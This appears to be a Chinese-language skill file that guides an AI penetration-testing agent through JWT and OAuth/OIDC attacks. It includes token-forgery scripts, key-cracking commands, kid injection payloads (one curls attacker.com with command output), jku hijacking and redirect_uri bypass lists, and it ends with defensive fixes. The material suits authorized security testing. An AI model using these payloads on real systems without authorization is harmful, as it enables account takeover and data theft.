---
name: jwt-oauth-testing
description: JWT和OAuth 2.0/OIDC安全测试专项技能，覆盖JWT算法混淆、密钥爆破、claim注入、OAuth授权流程漏洞、redirect_uri绕过等认证授权攻击面
metadata:
  version: 1.0.0
  categories: [web-security, authentication, authorization]
  requires_tools: [jwt-analyzer]
---

# JWT & OAuth Security Testing

## 使用边界与发散原则

- 本 skill 是最低覆盖要求、风险清单和证据标准，不是唯一测试路径或固定脚本。执行时必须根据目标技术栈、入口形态、认证状态、业务流程、已有证据、WAF/限速和授权范围调整方法。
- 文中的步骤、payload、命令、工具名和执行顺序默认是候选方法；除非本 skill、系统提示或后端门禁明确写为“必须/禁止/强制”，不要照抄固定列表，也不要因为示例没覆盖某个旁路、协议、参数位置、文件格式或业务入口就跳过。
- 发现阶段的字符串、端点、token、id、报错、组件名和扫描命中只作为候选信号；先记录和复核，不要仅凭单个关键词直接认定漏洞或加载多个无关专项流程。只有交互证据、可复现行为或明确进入对应专项测试时，才提升为专项验证。
- 每一步都应输出证据、判断理由和下一步分支；工具失败时先修参数、配置、环境或改用更合适的专业工具，确认无法覆盖时再使用通用命令兜底。
- 授权范围、低噪声、数据最小化、复现证据、误报排除和报告要求是硬边界；这些约束高于任何示例命令或默认流程。

## 概述

JWT（JSON Web Token）和OAuth 2.0是现代Web应用最常用的认证授权机制，但实现错误会导致严重的安全漏洞，包括身份伪造、权限提升、账户接管等。

**常见漏洞类型**：
- JWT算法混淆（`alg: none`, RSA→HMAC）
- 弱密钥爆破
- claim篡改（`sub`, `role`, `exp`）
- `kid`注入（SQL/Path Traversal/命令注入）
- OAuth重定向劫持（`redirect_uri`绕过）
- PKCE绕过
- Token泄露（XSS、日志、Referer）

---

## JWT基础

### JWT结构

```
Header.Payload.Signature

# 示例
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyMTIzIiwicm9sZSI6InVzZXIiLCJleHAiOjE3MDAwMDAwMDB9.signature

# Base64解码后：
Header:  {"alg": "HS256", "typ": "JWT"}
Payload: {"sub": "user123", "role": "user", "exp": 1700000000}
Signature: HMACSHA256(base64(header) + "." + base64(payload), secret_key)
```

### 常见算法

| 算法 | 类型 | 密钥 |
|------|------|------|
| HS256 | 对称 | 共享密钥 |
| RS256 | 非对称 | 公钥/私钥对 |
| ES256 | 非对称 | ECDSA |
| none | 无签名 | 无 |

---

## 测试流程

### 阶段1：JWT信息收集

#### 1.1 JWT位置识别

```markdown
常见位置：
- Authorization: Bearer <token>
- Cookie: jwt=<token>; access_token=<token>
- URL参数: ?token=<token>
- WebSocket握手: ws://api.com/chat?jwt=<token>
- LocalStorage: localStorage.getItem('token')
- Custom Header: X-Auth-Token: <token>
```

#### 1.2 JWT解码分析

使用CyberStrikeAI的jwt-analyzer工具：

```bash
# 解码JWT
jwt-analyzer decode --token "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."

# 输出示例：
{
  "header": {
    "alg": "HS256",
    "typ": "JWT",
    "kid": "key-2024"
  },
  "payload": {
    "sub": "user123",
    "role": "user",
    "iat": 1699900000,
    "exp": 1700000000
  }
}
```

**关键字段分析**：

```python
# Header字段
alg   # 算法：是否支持none? 是否可切换HS/RS?
typ   # 类型：通常是"JWT"
kid   # 密钥ID：是否可注入?
jku   # JWK Set URL：是否可劫持?
x5u   # X.509 URL：是否可劫持?

# Payload字段
sub   # 主体：用户ID，是否可篡改?
iss   # 签发者：是否验证?
aud   # 受众：是否验证?
exp   # 过期时间：是否强制验证?
iat   # 签发时间
nbf   # 生效时间
role/scope/permissions  # 权限字段，是否可提权?
```

---

### 阶段2：算法攻击

#### 2.1 `alg: none` 攻击

**原理**：将算法设为`none`，移除签名，服务器未严格验证算法。

```python
import base64
import json

# 原始token
original = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyMTIzIiwicm9sZSI6InVzZXIifQ.signature"

# 修改header
header = {"alg": "none", "typ": "JWT"}
payload = {"sub": "user123", "role": "admin"}  # 提权

# 构造恶意token
def base64url_encode(data):
    return base64.urlsafe_b64encode(json.dumps(data).encode()).decode().rstrip('=')

malicious_token = base64url_encode(header) + "." + base64url_encode(payload) + "."
# 注意：最后的点(.)不能省略，签名部分为空

# 测试
# curl -H "Authorization: Bearer ${malicious_token}" https://api.com/admin
```

**变种测试**：

```python
# 变种1: 大小写混淆
{"alg": "None"}
{"alg": "NONE"}
{"alg": "nOnE"}

# 变种2: 空字符串
{"alg": ""}

# 变种3: null值
{"alg": null}
```

#### 2.2 RS256→HS256算法混淆

**原理**：服务器用RS256签发token（私钥签名），但验证时接受HS256（用公钥当作HMAC密钥）。

```python
import jwt
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.backends import default_backend

# 1. 获取服务器的RSA公钥（通常从JWKS端点或证书）
public_key_pem = """
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA...
-----END PUBLIC KEY-----
"""

# 2. 提取公钥内容
public_key = serialization.load_pem_public_key(
    public_key_pem.encode(),
    backend=default_backend()
)

# 3. 将公钥当作HMAC密钥，用HS256签名
payload = {
    "sub": "user123",
    "role": "admin",  # 提权
    "exp": 9999999999
}

malicious_token = jwt.encode(
    payload,
    key=public_key_pem,  # 用公钥作为HMAC密钥
    algorithm="HS256"
)

# 4. 发送恶意token测试
```

**测试步骤**：

```markdown
1. 获取服务器公钥：
   - JWKS端点: /.well-known/jwks.json
   - 证书: /certs, /keys
   - 原始JWT的jku/x5u字段
   - SSL证书

2. 构造HS256 token（用公钥作为密钥）

3. 发送到需要认证的端点

4. 如果成功，说明存在算法混淆漏洞
```

#### 2.3 弱密钥爆破

**场景**：HS256使用弱密钥，可被暴力破解。

```bash
# 使用hashcat爆破JWT密钥
hashcat -a 0 -m 16500 jwt.txt rockyou.txt

# jwt.txt内容：
# eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyMTIzIn0.signature

# 或使用jwt_tool
python3 jwt_tool.py <token> -C -d /usr/share/wordlists/rockyou.txt
```

**常见弱密钥列表**：

```python
weak_secrets = [
    "secret",
    "secret123",
    "password",
    "jwt_secret",
    "your_secret_key",
    "change_this_secret",
    "default",
    "",  # 空字符串
    "key",
    "token",
]

# 自动化测试
import jwt

def test_weak_secrets(token, secrets):
    for secret in secrets:
        try:
            decoded = jwt.decode(token, secret, algorithms=["HS256"])
            print(f"✓ Found secret: {secret}")
            return secret
        except jwt.InvalidSignatureError:
            pass
    return None
```

---

### 阶段3：Claim篡改攻击

#### 3.1 用户身份篡改

```python
# 原始payload
{"sub": "user123", "role": "user"}

# 篡改测试
payloads = [
    {"sub": "admin", "role": "user"},           # 改为admin用户
    {"sub": "user123", "role": "admin"},        # 提升权限
    {"sub": "0", "role": "user"},               # 测试特殊ID
    {"sub": "../admin", "role": "user"},        # 路径遍历
    {"sub": "user123' OR '1'='1", "role": "user"},  # SQL注入
]
```

#### 3.2 时间字段篡改

```python
import time

# 延长过期时间
{
    "sub": "user123",
    "exp": 9999999999,  # 远期过期时间
    "iat": int(time.time()),
    "nbf": 0  # 立即生效
}

# 删除exp字段
{
    "sub": "user123"
    # 完全移除exp字段，测试是否强制验证过期
}
```

#### 3.3 自定义Claim注入

```python
# 业务相关字段注入
{
    "sub": "user123",
    "role": "admin",
    "is_premium": true,
    "credits": 999999,
    "subscription_level": "enterprise",
    "features": ["admin_panel", "export_data", "api_access"]
}
```

---

### 阶段4：Header注入攻击

#### 4.1 `kid` (Key ID) 注入

**场景**：服务器用`kid`字段查找密钥，但未验证输入。

##### 4.1.1 SQL注入

```python
# 假设服务器逻辑：
# SELECT key FROM keys WHERE kid = '{jwt.header.kid}'

header = {
    "alg": "HS256",
    "kid": "key1' OR '1'='1' --"  # SQL注入
}
```

##### 4.1.2 路径遍历

```python
# 假设服务器逻辑：
# key = open(f'/keys/{jwt.header.kid}').read()

header = {
    "alg": "HS256",
    "kid": "../../../../etc/passwd"  # 读取passwd作为密钥
}

# 如果成功，用/etc/passwd内容作为密钥重新签名JWT
```

##### 4.1.3 命令注入

```python
header = {
    "alg": "HS256",
    "kid": "key1; curl http://attacker.com/?data=$(whoami)"
}
```

##### 4.1.4 空字节注入

```python
header = {
    "alg": "HS256",
    "kid": "key1\x00admin"  # 截断后可能匹配到admin密钥
}
```

**自动化测试**：

```python
kid_payloads = [
    # SQL注入
    "' OR '1'='1' --",
    "' UNION SELECT 'known_secret' --",

    # 路径遍历
    "../../../dev/null",
    "../../../../etc/hostname",

    # 命令注入
    "; ls -la",
    "| whoami",

    # 空字节
    "valid_key\x00",
]

for payload in kid_payloads:
    test_jwt_with_kid(payload)
```

#### 4.2 `jku` (JWK Set URL) 劫持

**原理**：服务器从`jku`指定的URL获取公钥，攻击者可指向恶意服务器。

```python
# 1. 生成自己的RSA密钥对
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization

private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
public_key = private_key.public_key()

# 2. 构造恶意JWKS
jwks = {
    "keys": [{
        "kty": "RSA",
        "kid": "attacker-key",
        "use": "sig",
        "n": "<public_key_modulus>",
        "e": "AQAB"
    }]
}

# 3. 托管在攻击者服务器
# http://attacker.com/.well-known/jwks.json 返回上述JWKS

# 4. 构造恶意JWT
header = {
    "alg": "RS256",
    "jku": "http://attacker.com/.well-known/jwks.json",
    "kid": "attacker-key"
}
payload = {"sub": "admin", "role": "admin"}

# 用自己的私钥签名
malicious_token = jwt.encode(payload, private_key, algorithm="RS256", headers=header)
```

#### 4.3 `jwk` (Embedded JWK) 注入

**原理**：Header中直接嵌入公钥，服务器信任该公钥。

```python
header = {
    "alg": "RS256",
    "jwk": {
        "kty": "RSA",
        "kid": "attacker-key",
        "n": "<attacker_public_key_modulus>",
        "e": "AQAB"
    }
}
# 用对应的私钥签名
```

---

### 阶段5：OAuth 2.0漏洞测试

#### 5.1 `redirect_uri` 参数污染

**场景**：授权服务器未严格验证重定向URI，导致授权码泄露。

```markdown
# 正常流程
https://auth.com/authorize?
  client_id=abc123&
  redirect_uri=https://app.com/callback&
  response_type=code&
  state=random123

# 攻击测试
1. 开放重定向
   redirect_uri=https://evil.com

2. 子域接管
   redirect_uri=https://sub.app.com (如果sub被攻击者控制)

3. 路径遍历
   redirect_uri=https://app.com/../../evil.com

4. 参数注入
   redirect_uri=https://app.com/callback?evil=1%26code=

5. 主机名混淆
   redirect_uri=https://app.com.evil.com
   redirect_uri=https://evil.com@app.com
   redirect_uri=https://app.com%2f@evil.com

6. 协议降级
   redirect_uri=http://app.com/callback (降级为HTTP)

7. JavaScript伪协议
   redirect_uri=javascript:alert(document.domain)

8. 通配符绕过
   redirect_uri=https://app.com.evil.com (如果白名单是*.app.com)
```

**自动化测试**：

```python
base_url = "https://auth.com/authorize"
params = {
    "client_id": "abc123",
    "response_type": "code",
    "state": "test"
}

redirect_payloads = [
    "https://evil.com",
    "https://app.com.evil.com",
    "https://app.com@evil.com",
    "https://app.com%2f.evil.com",
    "https://app.com/callback/../../../evil.com",
    "http://app.com/callback",  # 协议降级
]

for payload in redirect_payloads:
    params["redirect_uri"] = payload
    # 访问授权URL并观察是否成功重定向
    test_oauth_redirect(base_url, params)
```

#### 5.2 State参数CSRF

**场景**：OAuth流程中未使用或未验证`state`参数。

```markdown
# 攻击流程
1. 攻击者发起授权请求（不带state或固定state）
2. 获得授权URL并诱使受害者点击
3. 受害者授权后，授权码返回给攻击者
4. 攻击者使用该授权码绑定受害者账号到攻击者的第三方账户
```

**测试步骤**：

```python
# 测试1：完全省略state参数
url1 = "https://auth.com/authorize?client_id=abc&redirect_uri=https://app.com/callback&response_type=code"

# 测试2：固定state值
url2 = "https://auth.com/authorize?client_id=abc&redirect_uri=https://app.com/callback&response_type=code&state=fixed"

# 测试3：重放state值
# 1. 正常发起授权，记录state
# 2. 重新发起授权，使用相同state
# 3. 如果允许，说明state未绑定session
```

#### 5.3 授权码重放

**测试**：授权码是否可多次使用。

```python
# 1. 正常获取授权码
code = "captured_authorization_code"

# 2. 第一次兑换token
token1 = exchange_code_for_token(code)

# 3. 尝试再次使用同一授权码
token2 = exchange_code_for_token(code)

# 如果token2获取成功，说明授权码可重放
```

#### 5.4 PKCE绕过

**场景**：公共客户端（如SPA、移动应用）应使用PKCE，但实现有缺陷。

```markdown
# PKCE正常流程
1. 生成code_verifier (随机字符串)
2. 计算code_challenge = BASE64URL(SHA256(code_verifier))
3. 授权请求带上code_challenge
4. Token请求带上code_verifier
5. 服务器验证 SHA256(code_verifier) == code_challenge

# 攻击测试
1. 省略code_challenge
   测试：授权时不带code_challenge，token请求也不带code_verifier

2. 使用明文code_challenge
   code_challenge=plain_text&code_challenge_method=plain
   （验证是否接受plain方法）

3. code_verifier暴力破解
   如果code_verifier过短，可暴力枚举
```

#### 5.5 Implicit Flow令牌泄露

**风险**：Implicit Flow将access_token直接返回在URL Fragment。

```markdown
# 授权响应
https://app.com/callback#access_token=abc123&token_type=bearer

# 泄露风险
1. Referer泄露：
   页面加载外部资源时，URL fragment不会发送到服务器，但可能通过JS泄露

2. 浏览器历史：
   Token明文存储在浏览器历史记录

3. XSS窃取：
   document.location.hash 可被XSS读取

测试：
- 检查是否使用Implicit Flow
- 建议迁移到Authorization Code Flow + PKCE
```

---

### 阶段6：OpenID Connect (OIDC) 测试

#### 6.1 ID Token伪造

**OIDC特有字段**：

```json
{
  "iss": "https://auth.com",
  "sub": "user123",
  "aud": "client_id",
  "exp": 1700000000,
  "iat": 1699900000,
  "nonce": "random456",
  "email": "user@example.com",
  "email_verified": true
}
```

**测试点**：

```python
# 1. 篡改email
{"email": "admin@example.com", "email_verified": true}

# 2. 篡改aud (受众)
{"aud": "other_client_id"}  # 跨应用令牌复用

# 3. 删除nonce (重放保护)
# 移除nonce字段，测试是否强制验证
```

#### 6.2 UserInfo端点越权

```bash
# 正常请求
curl -H "Authorization: Bearer <token>" https://auth.com/userinfo

# 测试
1. 使用过期token
2. 使用其他应用的token
3. 篡改token中的sub字段，获取其他用户信息
```

---

## 工具集成

### CyberStrikeAI内置工具

```bash
# JWT解码
jwt-analyzer decode --token <token>

# JWT验证
jwt-analyzer verify --token <token> --secret <secret>

# 弱密钥爆破
jwt-analyzer crack --token <token> --wordlist /path/to/wordlist.txt

# 算法切换测试
jwt-analyzer test-alg --token <token>
```

### 外部工具

```bash
# jwt_tool (推荐)
python3 jwt_tool.py <token> -T  # 自动化测试所有漏洞

# hashcat
hashcat -m 16500 jwt.txt rockyou.txt

# Burp Suite扩展
# - JSON Web Tokens
# - JWT4B
```

---

## 实战案例

### 案例1：alg=none导致权限提升

**目标**：某API使用JWT认证

**发现**：
```python
# 原始token (普通用户)
{"alg": "HS256", "typ": "JWT"}.{"sub": "user123", "role": "user"}

# 修改为admin
header = {"alg": "none", "typ": "JWT"}
payload = {"sub": "user123", "role": "admin"}
malicious = base64(header) + "." + base64(payload) + "."

# 测试
curl -H "Authorization: Bearer ${malicious}" https://api.com/admin/users
# 成功访问admin端点
```

### 案例2：kid注入读取任意文件

**发现**：
```python
# 测试payload
header = {"alg": "HS256", "kid": "../../../../etc/hostname"}

# 获取/etc/hostname内容 (如"webapp-server")
# 用"webapp-server"作为密钥签名JWT
token = jwt.encode(payload, "webapp-server", algorithm="HS256", headers=header)

# 成功绕过验证
```

### 案例3：OAuth redirect_uri绕过

**目标**：OAuth Provider验证不严

**测试**：
```
正常: redirect_uri=https://app.com/callback
绕过: redirect_uri=https://app.com.evil.com

授权码泄露到evil.com，攻击者接管账户
```

---

## 输出报告模板

```markdown
# JWT & OAuth安全测试报告

## 目标
- API: https://api.example.com
- OAuth Provider: https://auth.example.com

## JWT分析
- 算法: HS256
- 密钥强度: 弱 (使用"secret")
- 关键Claim: sub, role, exp

## 漏洞发现

### [严重] JWT弱密钥
**描述**: 使用弱密钥"secret"签名JWT

**PoC**:
\`\`\`bash
hashcat -m 16500 token.txt rockyou.txt
# 2秒破解出密钥: secret
\`\`\`

**影响**: 攻击者可伪造任意用户token

**修复**: 使用强随机密钥 (至少256位)

### [严重] kid路径遍历
**描述**: kid字段未过滤，可读取任意文件

**PoC**:
\`\`\`python
header = {"alg": "HS256", "kid": "../../../../etc/hostname"}
# 用文件内容作为密钥签名成功
\`\`\`

**影响**: 绕过JWT验证，伪造任意token

**修复**:
1. 白名单验证kid值
2. 使用UUID作为kid
3. 避免直接拼接文件路径

### [高危] OAuth redirect_uri验证不足
**描述**: 允许重定向到任意子域

**PoC**:
\`\`\`
https://auth.com/authorize?
  client_id=abc123&
  redirect_uri=https://evil.example.com&
  response_type=code
\`\`\`

**影响**: 授权码泄露，账户接管

**修复**: 严格匹配完整URL，不使用前缀匹配
```

---

## 防御建议

### JWT安全

1. **使用强密钥**: 至少256位随机字符串
2. **强制算法验证**: 明确指定允许的算法，拒绝`none`
3. **验证所有Claim**: 特别是`exp`, `iss`, `aud`
4. **避免敏感数据**: JWT是Base64编码，不是加密
5. **使用短过期时间**: access_token < 15分钟
6. **实施Token轮换**: Refresh token定期轮换

### OAuth安全

1. **严格验证redirect_uri**: 完全匹配，不使用通配符
2. **强制state参数**: 防止CSRF
3. **使用PKCE**: 公共客户端必须使用
4. **授权码单次使用**: 使用后立即失效
5. **避免Implicit Flow**: 迁移到Authorization Code + PKCE

---

## 参考资料

- [JWT.io Handbook](https://jwt.io/introduction)
- [OWASP JWT Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html)
- [OAuth 2.0 Security Best Practices](https://datatracker.ietf.org/doc/html/draft-ietf-oauth-security-topics)
- [PortSwigger JWT Attacks](https://portswigger.net/web-security/jwt)
